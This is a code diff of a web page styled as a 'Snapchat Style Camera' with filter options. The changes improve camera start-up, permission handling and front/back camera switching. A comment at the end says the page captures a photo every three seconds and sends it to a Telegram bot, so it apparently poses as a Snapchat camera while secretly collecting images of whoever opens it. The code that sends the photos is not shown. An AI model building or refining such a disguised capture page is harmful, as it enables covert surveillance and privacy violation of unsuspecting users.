@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat Style Camera</title>
     <link rel="icon" href="modern-badge-snapchat-icon_578229-160.avif" type="image/avif">
-
     <style>
         /* Body style */
         body {
@@ -111,7 +110,7 @@
     <div class="snap-bar">SNAPCHAT</div>
 
     <!-- Camera video window -->
-    <video id="video" width="320" height="480" autoplay></video>
+    <video id="video" width="320" height="480" autoplay playsinline></video>
 
     <!-- Filter options below the video -->
     <div class="filters">
@@ -139,29 +138,37 @@
         let useFrontCamera = true; // Front camera is used by default
 
         // Function to start the camera stream
-        function startCamera() {
-            const constraints = {
-                video: {
-                    facingMode: useFrontCamera ? "user" : "environment"
-                }
-            };
+        async function startCamera() {
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: useFrontCamera ? "user" : "environment"
+                    }
+                };
 
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    video.srcObject = stream;
-                })
-                .catch(err => {
-                    console.error("Error accessing the camera: ", err);
-                });
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+            } catch (err) {
+                alert("Unable to access the camera. Please check your camera permissions.");
+                console.error("Error accessing the camera: ", err);
+            }
         }
 
         // Start the camera initially
         startCamera();
 
         // Switch between front and back camera
-        document.getElementById('toggleCamera').addEventListener('click', () => {
+        document.getElementById('toggleCamera').addEventListener('click', async () => {
             useFrontCamera = !useFrontCamera;
-            startCamera();
+
+            // Stop the current camera stream
+            if (video.srcObject) {
+                const tracks = video.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+
+            // Restart the camera with the new facing mode
+            await startCamera();
         });
 
         // Capture photo every 3 seconds and send to Telegram bot
